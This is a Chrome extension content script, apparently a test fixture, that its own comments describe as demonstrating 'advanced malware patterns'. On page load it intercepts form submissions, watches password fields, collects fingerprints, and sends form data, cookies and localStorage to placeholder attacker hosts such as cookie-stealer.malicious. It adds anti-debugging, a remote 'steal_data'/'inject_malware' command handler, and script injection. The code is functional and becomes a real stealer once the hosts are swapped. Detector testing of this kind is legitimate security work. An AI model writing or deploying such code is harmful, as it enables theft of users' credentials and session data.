// TEST EXTENSION: Content script demonstrating advanced malware patterns

console.log('TEST: Advanced malware content script loaded');

// Pattern 1: Form hijacking in content script
document.addEventListener('submit', function(event) {
  console.log('TEST: Form submission intercepted');
  
  const form = event.target;
  const formData = new FormData(form);
  const submissionData = {
    action: form.action,
    method: form.method,
    url: window.location.href,
    timestamp: Date.now(),
    fields: {}
  };
  
  // Extract form field data
  for (let [key, value] of formData.entries()) {
    submissionData.fields[key] = value;
  }
  
  console.log('TEST: Form data captured:', submissionData);
  
  // Simulate sending to malicious server
  fetch('https://form-stealer.malicious/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Stealer-ID': chrome.runtime.id
    },
    body: JSON.stringify(submissionData)
  }).catch(err => {
    console.log('TEST: Form data transmission failed (expected):', err.message);
  });
});

// Pattern 2: Password field monitoring
function monitorPasswordFields() {
  const passwordFields = document.querySelectorAll('input[type="password"]');
  
  passwordFields.forEach((field, index) => {
    console.log(`TEST: Monitoring password field ${index + 1}`);
    
    // Monitor password input
    field.addEventListener('input', function() {
      console.log('TEST: Password input detected:', {
        field: this.name || this.id,
        length: this.value.length,
        url: window.location.href
      });
      
      // Send to background script
      chrome.runtime.sendMessage({
        type: 'password_input',
        data: {
          field: this.name || this.id,
          length: this.value.length,
          url: window.location.href,
          timestamp: Date.now()
        }
      });
    });
  });
}

// Pattern 3: Clickjacking detection
function setupClickjacking() {
  console.log('TEST: Setting up clickjacking detection');
  
  // Look for elements that might be used for clickjacking
  const suspiciousElements = document.querySelectorAll('[style*="opacity: 0"], [style*="visibility: hidden"], [style*="pointer-events: none"]');
  
  suspiciousElements.forEach((element, index) => {
    console.log(`TEST: Suspicious element ${index + 1} found:`, {
      tagName: element.tagName,
      style: element.getAttribute('style'),
      position: element.getBoundingClientRect()
    });
  });
}

// Pattern 4: Social engineering popups
function setupSocialEngineering() {
  console.log('TEST: Setting up social engineering');
  
  // Simulate fake security warnings
  setTimeout(() => {
    console.log('TEST: Would show fake security alert');
    // alert('WARNING: Your browser has been compromised! Click OK to run security scan.');
  }, 5000);
  
  // Simulate fake update prompts
  setTimeout(() => {
    console.log('TEST: Would show fake update prompt');
    // confirm('A new version of your browser is available. Update now?');
  }, 8000);
}

// Pattern 5: Browser fingerprinting
function performFingerprinting() {
  console.log('TEST: Performing browser fingerprinting');
  
  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
    timestamp: Date.now()
  };
  
  console.log('TEST: Browser fingerprint collected:', fingerprint);
  
  // Send fingerprint to malicious server
  fetch('https://fingerprint-collector.malicious/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(fingerprint)
  }).catch(err => {
    console.log('TEST: Fingerprint transmission failed (expected):', err.message);
  });
}

// Pattern 6: Cookie theft
function stealCookies() {
  console.log('TEST: Attempting cookie theft');
  
  const cookies = document.cookie;
  console.log('TEST: Cookies stolen:', cookies);
  
  // Send cookies to malicious server
  fetch('https://cookie-stealer.malicious/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      cookies: cookies,
      domain: window.location.hostname,
      timestamp: Date.now()
    })
  }).catch(err => {
    console.log('TEST: Cookie transmission failed (expected):', err.message);
  });
}

// Pattern 7: Local storage theft
function stealLocalStorage() {
  console.log('TEST: Attempting local storage theft');
  
  const storageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    storageData[key] = localStorage.getItem(key);
  }
  
  console.log('TEST: Local storage stolen:', storageData);
  
  // Send to malicious server
  fetch('https://storage-stealer.malicious/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      localStorage: storageData,
      url: window.location.href,
      timestamp: Date.now()
    })
  }).catch(err => {
    console.log('TEST: Storage transmission failed (expected):', err.message);
  });
}

// Pattern 8: Anti-debugging in content script
function setupContentAntiDebugging() {
  console.log('TEST: Setting up content script anti-debugging');
  
  // Debugger statement
  debugger;
  
  // Console clearing
  console.clear();
  
  // Environment detection
  if (typeof window.chrome !== 'undefined') {
    console.log('TEST: Chrome environment detected in content script');
  }
  
  // Stealth timing with random delays
  const stealthOperations = [
    () => console.log('TEST: Stealth operation 1'),
    () => console.log('TEST: Stealth operation 2'),
    () => console.log('TEST: Stealth operation 3')
  ];
  
  stealthOperations.forEach((operation, index) => {
    setTimeout(operation, Math.random() * 10000 + (index * 5000));
  });
}

// Pattern 9: Communication with background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log('TEST: Message received in content script:', message);
  
  if (message.type === 'steal_data') {
    // Perform data theft on command
    stealCookies();
    stealLocalStorage();
    performFingerprinting();
    
    sendResponse({ status: 'data_stolen' });
  }
  
  if (message.type === 'inject_malware') {
    // Simulate malware injection
    console.log('TEST: Injecting additional malware code');
    
    const maliciousScript = document.createElement('script');
    maliciousScript.textContent = `
      console.log('TEST: Injected malware script executed');
      // Additional malicious code would go here
    `;
    document.head.appendChild(maliciousScript);
    
    sendResponse({ status: 'malware_injected' });
  }
});

// Initialize all malware patterns when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeMalware);
} else {
  initializeMalware();
}

function initializeMalware() {
  console.log('TEST: Initializing advanced malware patterns');
  
  monitorPasswordFields();
  setupClickjacking();
  setupSocialEngineering();
  performFingerprinting();
  stealCookies();
  stealLocalStorage();
  setupContentAntiDebugging();
  
  console.log('TEST: All malware patterns initialized in content script');
}
